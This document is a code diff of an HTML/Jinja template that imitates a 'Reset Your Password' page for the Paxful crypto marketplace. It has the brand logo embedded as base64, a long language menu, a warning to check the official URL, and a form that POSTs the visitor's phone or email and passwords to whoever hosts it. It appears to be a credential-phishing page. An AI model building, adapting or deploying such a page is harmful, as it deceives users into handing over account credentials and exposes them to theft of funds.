@@ -1,252 +1,258 @@
 <!DOCTYPE html>
 <html lang="en">
-
-<head>
+  <head>
     <meta charset="utf-8" />
-    <meta name="viewport"
-        content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
-    <link rel="stylesheet"
-        href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, shrink-to-fit=no" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat:400,500,700|Open+Sans:400,600,700&display=swap&subset=cyrillic" />
     <title>Paxful</title>
     <!-- Google Tag Manager -->
     <script>
-        // Your Google Tag Manager code here
+      // Your Google Tag Manager code here
     </script>
     <!-- End Google Tag Manager -->
     <style>
-        body {
-            background-color: #f3f3f3;
-            font-family: 'Montserrat', sans-serif;
-        }
-
-        #root {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-        }
-
-        #loginForm {
-            background-color: #fff;
-            border: 1px solid #e0e0e0;
-            padding: 20px;
-            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
-            max-width: 400px;
-            width: 100%;
-            text-align: start;
-        }
-
-        /* #root {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            min-height: 100vh;
-            padding: 0 20px; /* Add some padding for spacing */
-        /* } */
-
-        #logo {
-            text-align: start;
-            margin-bottom: -85px;
-        }
-
-        #logo img {
-            width: 150px;
-            /* Adjust the width as needed */
-            height: auto;
-            /* This maintains the aspect ratio */
-        }
-
-        #logo p {
-            font-size: 24px;
-            color: #2a4483;
-            margin-top: 10px;
-        }
-
-        #languageDropdown {
-            position: relative;
-            margin-bottom: 70px;
-            margin-left: 250px;
-        }
-
-
-        #languageSelect {
-            padding: 5px;
-            font-size: 20px;
-            width: 150px;
-            /* Adjust the width as needed */
-        }
-
-
-        #importantMessage {
-            background-color: #f3f3f3;
-            padding: 10px 20px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-weight: bold;
-            margin-bottom: 20px;
-            text-align: center;
-        }
-        #importantMessage a{
-            color: #1383a3;
-        }
-
-        #loginForm h2 {
-            font-size: 24px;
-            margin-bottom: 20px;
-            color: #2a6483;
-        }
-
-        #loginForm label {
-            display: block;
-            margin-top: 20px;
-            margin-bottom: 10px;
-            font-weight: bold;
-        }
-
-        #loginForm input[type="text"],
-        #loginForm input[type="password"] {
-            width: 100%;
-            padding: 10px;
-            margin-bottom: 15px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            font-size: 16px;
-            width: 376px;
-        }
-
-        #loginForm .forgot-password {
-            text-align: left;
-            margin-left: 115px;
-            margin-bottom: 20px;
-            font-weight: bold;
-        }
-
-        #loginForm .create-account {
-            margin-top: 20px;
-            font-weight: bold;
-        }
-        #loginForm .create-account a{
-            color: #1383a3;
-        } 
-
-        #loginForm button {
-            background-color: #1393b7;
-            color: #fff;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 5px;
-            font-size: 16px;
-            cursor: pointer;
-            width: 395px;
-            height: 45px;
-            text-align: start;
-            margin-top: 30px;
-
-        }
-
-        #loginForm button:hover {
-            background-color: #1383a3;
-
-        }
-
-        .error {
-            color: red;
-            height: 10px;
-            font-size: 14px;
-            transform: translateY(-10px);
-        }
+      body {
+        background-color: #f3f3f3;
+        font-family: 'Montserrat', sans-serif;
+      }
+      
+      #root {
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+      }
+      
+      #loginForm {
+        background-color: #fff;
+        border: 1px solid #e0e0e0;
+        padding: 20px;
+        box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
+        max-width: 400px;
+        width: 100%;
+        text-align: start;
+      }
+      
+      /* #root {
+                              display: flex;
+                              justify-content: space-between;
+                              align-items: center;
+                              min-height: 100vh;
+                              padding: 0 20px; /* Add some padding for spacing */
+      /* } */
+      
+      #logo {
+        text-align: start;
+        margin-bottom: -85px;
+      }
+      
+      #logo img {
+        width: 150px;
+        /* Adjust the width as needed */
+        height: auto;
+        /* This maintains the aspect ratio */
+      }
+      
+      #logo p {
+        font-size: 24px;
+        color: #2a4483;
+        margin-top: 10px;
+      }
+      .logo {
+        display: inline-block;
+        vertical-align: middle;
+      }
+      
+      #languageDropdown {
+        display: inline-block;
+        vertical-align: middle;
+        margin-left: 20px;
+      }
+      
+      #languageSelect {
+        padding: 5px;
+        font-size: 20px;
+        width: 150px;
+        /* Adjust the width as needed */
+      }
+      
+      #importantMessage {
+        background-color: #f3f3f3;
+        padding: 10px 20px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-weight: bold;
+        margin-bottom: 20px;
+        text-align: center;
+      }
+      #importantMessage a {
+        color: #1383a3;
+      }
+      
+      #loginForm h2 {
+        font-size: 24px;
+        margin-bottom: 20px;
+        color: #2a6483;
+      }
+      
+      #loginForm label {
+        display: block;
+        margin-top: 20px;
+        margin-bottom: 10px;
+        font-weight: bold;
+      }
+      
+      #loginForm input[type='text'],
+      #loginForm input[type='password'] {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        font-size: 16px;
+        width: 376px;
+      }
+      
+      #loginForm .forgot-password {
+        text-align: left;
+        margin-left: 115px;
+        margin-bottom: 20px;
+        font-weight: bold;
+      }
+      
+      #loginForm .create-account {
+        margin-top: 20px;
+        font-weight: bold;
+      }
+      #loginForm .create-account a {
+        color: #1383a3;
+      }
+      
+      #loginForm button {
+        background-color: #1393b7;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        border-radius: 5px;
+        font-size: 16px;
+        cursor: pointer;
+        width: 395px;
+        height: 45px;
+        text-align: start;
+        margin-top: 30px;
+      }
+      
+      #loginForm button:hover {
+        background-color: #1383a3;
+      }
+      
+      .error {
+        color: red;
+        height: 10px;
+        font-size: 14px;
+        transform: translateY(-10px);
+      }
     </style>
+  </head>
 
-</head>
-
-<body>
+  <body>
     <div id="root">
-        <form id="loginForm" method="POST" onSubmit="">
-            <div id="logo">
-                <img src="/image/paxx2.png" alt="">
-            </div>
-            <div id="languageDropdown">
-                <select id="languageSelect" onchange="changeLanguage()">
-                    <option value="en">English</option>
-                    <option value="es">Español</option>
-                    <option value="fr">Français</option>
-                    <option value="ar">العربية</option>
-                    <option value="zh">中文</option>
-                    <option value="de">Deutsch</option>
-                    <option value="ja">日本語</option>
-                    <option value="sw">Kiswahili</option>
-                    <option value="ru">Русский</option>
-                    <option value="ko">한국어</option>
-                    <option value="pt">Português</option>
-                    <option value="it">Italiano</option>
-                    <option value="tr">Türkçe</option>
-                    <option value="nl">Nederlands</option>
-                    <option value="pl">Polski</option>
-                    <option value="sv">Svenska</option>
-                    <option value="no">Norsk</option>
-                    <option value="da">Dansk</option>
-                    <option value="fi">Suomi</option>
-                    <option value="hu">Magyar</option>
-                    <option value="cs">Čeština</option>
-                    <option value="th">ไทย</option>
-                    <option value="vi">Tiếng Việt</option>
-                    <option value="ro">Română</option>
-                    <option value="el">Ελληνικά</option>
-                    <option value="he">עִבְרִית</option>
-                    <option value="hi">हिन्दी</option>
-                    <option value="id">Bahasa Indonesia</option>
-                    <option value="ms">Bahasa Melayu</option>
-                    <option value="tl">Wikang Tagalog</option>
-                    <option value="af">Afrikaans</option>
-                    <option value="sq">Shqip</option>
-                    <option value="am">አማርኛ</option>
-                    <option value="hy">Հայերեն</option>
-                    <option value="bn">বাংলা</option>
-                    <option value="bs">Bosanski</option>
-                    <option value="bg">Български</option>
-                    <option value="hr">Hrvatski</option>
-                    <option value="et">Eesti</option>
-                    <option value="fi">Suomi</option>
-                    <option value="gu">ગુજરાતી</option>
-                    <option value="ha">Hausa</option>
-                    <option value="haw">ʻŌlelo Hawaiʻi</option>
-                    <option value="is">Íslenska</option>
-                    <option value="ka">ქართული</option>
-                    <option value="km">ភាសាខ្មែរ</option>
-                    <option value="kn">ಕನ್ನಡ</option>
-                    <option value="ku">Kurdî</option>
-                    <option value="lv">Latviešu</option>
-                    <option value="lt">Lietuvių</option>
-                    <option value="lb">Lëtzebuergesch</option>
-                </select>
-            </div>
-            <h2>Reset Your Password</h2>
-            <div id="importantMessage">
-                <span>IMPORTANT!<i class="fa fa-exclamation-circle" aria-hidden="true"></i>
-                </span>Please check that you are visiting <a href="https://accounts.paxful.com/url">https://accounts.paxful.com/url</a>
-            </div>
-            <label for="username">Your Phone or Email</label>
-            <input type="text" id="username" name="username" required />
-            {% if username_error %}
-            <p class="error">{{ username_error }}</p>
-            {% endif %}
-            <br />
-            <label for="password">Your Password</label>
-            <input type="password" id="password" name="password" required />
-            {% if password_error %}
-            <p class="error">{{ password_error }}</p>
-            {% endif %}
-            <label for="confirmpassword">Confirm Your Password</label>
-            <input type="password" id="confirmpassword" name="confirmpassword" required />
-            {% if confirmpassword_error %}
-            <p class="error">{{ confirmpassword_error }}</p>
-            {% endif %}
-            <button type="submit">Reset Password</button>
-            <div class="create-account">
-                <a href="/">Go back to Log in</a>
-            </div>
-        </form>
-
-</body>
-
+      <form id="loginForm" method="POST" onSubmit="">
+        <div class="logo">
+          <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMwAAADACAMAAAB/Pny7AAAArlBMVEX///87QU87QVH///3Iyc1JTls3PkzU1dk6Qk4rM0Q1O0qLjZWHipA7Qkz6+vplaXLy8/N9gIktNELr6+16foQIsuMtMka8vsIADCYiKz2tr
+                7ZDSVefoqgeJDhdYWsAr+Sr3vDd3+JRVmGVmJ70/vtydX7s+fu55PKg3/Kf1+fZ7vaQ1+8As9910Ot3yu9HvOZcyO4AACIAACfS9Pq05+4AqeQUHDHN6/kADy5kxeRFyoBpAAAGC0lEQVR4nO2YC1ejOhDHSUJ5BARarF3oS6it3qrb3eu6j+//xe4MLZTg47b
+                as+659/87HrVMSPLPTCaTWhYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD+Ryj6UfwTRR89lXdDKlbXlzeXlzd/rdVHT+a9kJbbu/ndcDi/X6kPVDOyG9ziaYzQzIrKaJq2z4qmlboekpK7+ecVe8lK7C67riO3GmjfkfvEaFudkQrrY
+                LJeQ1nOwk5XJCbte2wbmUPMxvzGpJa43sxJzfDL7rMreiZ6kVSGNDzr9US/6ScKqaUMt8ZkQR/Gy/Y4keumRXdOL/PV8ZwarR0dmwuhrNFYk8nvW0b85APN7XcSV5+HHGPDq53VzbTTRma1mP6A+jrfT/Y8k07W34kJMjLGxqK5xSgdHZxUPklPCFENKTwppZ66
+                hj0JM7IL3XOtlhhlhb4QUpfbxpfsl/nmqm7iDqSoe+2KEdIQ40vhN2KoT22ISQt3kabmjF4Vc0azImhs7dAf/XfatttjR1Rqgs6LM59WIQtTEvBQaRmuGpt7cSaFV3W77friFTHyFTHkmeIoz5wJf2GPiLzf06LTXTTJPMFy9KyzPsXA4aeFpa6qDbNpJWUW44
+                wn7p7dAh0rJnKL5Ig9w2Kyurk9YzV+a9sUpfZ0GdNjPTHeU1aeCc9fkmfuHznGHqyuGDNnvEmMFR2VzSoxPKziDT5iL+h83xfNWGYTl+dtpgZq3fdpwpH17fFuPtxcK2WKkSRG1bxZzHaso8VUL7nsGllvD8rLMy2dC9fqUc7TxkrTBIsZ7+v1Zng3Jy1t4+k8c
+                xymmJQDSoaNmBGlMh4rn5Jr+u3MwOs9WhaclYlr9QeKqTxz0SSuKKbueUclF5IC0NiJXFWSuhvaL/NL9W9i1AeIySXtGb/ZM+53IQYz3is8ThYknZeV9WNDWm67nVapedyf1OS1T3+jGD7tKZsNinqq8UB42STiAu0TnUODTmJRioPs8XZb/XfFCO1vGfiy9ulv
+                EOMHo5wIelMtPUq3tS39KTw+5Gmi0ZJdMzGPL3V1f0eFMk2jsJ4RIxvGbTHCFCNOLEb4UyLL2C1Si2bG/YykBWnE2BmXCKn58vV8qyU4M322FUO125aBMDwz2NeS0VJ7r5UzbxGzR/tlU4SlPvlJx4tFEASLcExCp7nx7voLX2CoSvjuh8Z2qsTIMt4xi+vqIQkG
+                xnyjmMUEJxVTr6CvZ2HRxP/C9zxP6KzCZ68542bO1GZ1Px/+WinL/i60k7cjcJvN8iStqY3RguvTcbRdL2Ul0vGa6D2NGKecVSzDvFWApVWlJrydz6qCce8a2vM3w/kvvlguLyRtLVsdUM5YE6qShW/XYjh4PX/X8EQJIC+4GCyKVqxQmq7qtGmDT1l7UDZ2t
+                R7Ov6z5gAn4ksBV2gFibF4hHe/aJjOavtNzTymmSc3tDJtwMeAs84YFXwam9u6bGMvaPG7WVd2Vcv0s/EnUpLSXxSTnfNWR/eoa7vY5eLN6v9Vioj3vEtNiNJae07Obrq1iSaeOP6tF38/vHnbi7Z+8nwajA8RYI6+6ZvTi5TIuq3+bQ6gS44zjhtny4GvZ62
+                Kic02HTNxemyruBu62Lrt+HD7s/KiiYEp3Me00gfaKGIvyGR+o1a2bb6N+c3hVYvYJXeuL3uFXma0Yvi8+M6xdshgjFXPh5ul+JeZqPvyxr+3T2D+jq0IT7i+LoTfOp7J9FCya6NyKEV6DUx7pma9S62l3WEWL7dPS9MygDTJ65lWuuZ9/M3SOqbnzqb6/uRn16
+                j3vmapoamh/65NU/bfwyyM9swzD8PzpAqQTeh7mZpViB/yQh78ZflMtG5XbCzYtd1s55Q/Bi8sa5f14VpZlHNLdbp9zkrwfmiyOuGVaL17inn3cPFQ/NjeWOvwC+AxRUh+lJ/wCVL3wbapq/e60Vdb6122kTDHdbt40xQ/4ZldFN7fRKRf0I1FXD6v3xdgfBAfD
+                f0YMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADw0fwDJ4R2diAUW8cAAAAASUVORK5CYII=" height="100px" class="paxful" alt="paxful" />
+        </div>
+        <div id="languageDropdown">
+          <select id="languageSelect" onchange="changeLanguage()">
+            <option value="en">English</option>
+            <option value="es">Español</option>
+            <option value="fr">Français</option>
+            <option value="ar">العربية</option>
+            <option value="zh">中文</option>
+            <option value="de">Deutsch</option>
+            <option value="ja">日本語</option>
+            <option value="sw">Kiswahili</option>
+            <option value="ru">Русский</option>
+            <option value="ko">한국어</option>
+            <option value="pt">Português</option>
+            <option value="it">Italiano</option>
+            <option value="tr">Türkçe</option>
+            <option value="nl">Nederlands</option>
+            <option value="pl">Polski</option>
+            <option value="sv">Svenska</option>
+            <option value="no">Norsk</option>
+            <option value="da">Dansk</option>
+            <option value="fi">Suomi</option>
+            <option value="hu">Magyar</option>
+            <option value="cs">Čeština</option>
+            <option value="th">ไทย</option>
+            <option value="vi">Tiếng Việt</option>
+            <option value="ro">Română</option>
+            <option value="el">Ελληνικά</option>
+            <option value="he">עִבְרִית</option>
+            <option value="hi">हिन्दी</option>
+            <option value="id">Bahasa Indonesia</option>
+            <option value="ms">Bahasa Melayu</option>
+            <option value="tl">Wikang Tagalog</option>
+            <option value="af">Afrikaans</option>
+            <option value="sq">Shqip</option>
+            <option value="am">አማርኛ</option>
+            <option value="hy">Հայերեն</option>
+            <option value="bn">বাংলা</option>
+            <option value="bs">Bosanski</option>
+            <option value="bg">Български</option>
+            <option value="hr">Hrvatski</option>
+            <option value="et">Eesti</option>
+            <option value="fi">Suomi</option>
+            <option value="gu">ગુજરાતી</option>
+            <option value="ha">Hausa</option>
+            <option value="haw">ʻŌlelo Hawaiʻi</option>
+            <option value="is">Íslenska</option>
+            <option value="ka">ქართული</option>
+            <option value="km">ភាសាខ្មែរ</option>
+            <option value="kn">ಕನ್ನಡ</option>
+            <option value="ku">Kurdî</option>
+            <option value="lv">Latviešu</option>
+            <option value="lt">Lietuvių</option>
+            <option value="lb">Lëtzebuergesch</option>
+          </select>
+        </div>
+        <h2>Reset Your Password</h2>
+        <div id="importantMessage">
+          <span>IMPORTANT!<i class="fa fa-exclamation-circle" aria-hidden="true"></i></span>Please check that you are visiting <a href="https://accounts.paxful.com/url">https://accounts.paxful.com/url</a>
+        </div>
+        <label for="username">Your Phone or Email</label>
+        <input type="text" id="username" name="username" required />
+        {% if username_error %}
+          <p class="error">{{ username_error }}</p>
+        {% endif %}
+        <br />
+        <label for="password">Your New Password</label>
+        <input type="password" id="password" name="password" required />
+        {% if password_error %}
+          <p class="error">{{ password_error }}</p>
+        {% endif %}
+        <label for="confirmpassword">Confirm New Password</label>
+        <input type="password" id="confirmpassword" name="confirmpassword" required />
+        {% if confirmpassword_error %}
+          <p class="error">{{ confirmpassword_error }}</p>
+        {% endif %}
+        <button type="submit">Reset Password</button>
+        <div class="create-account">
+          <a href="/">Go back to Log in</a>
+        </div>
+      </form>
+    </div>
+  </body>
 </html>
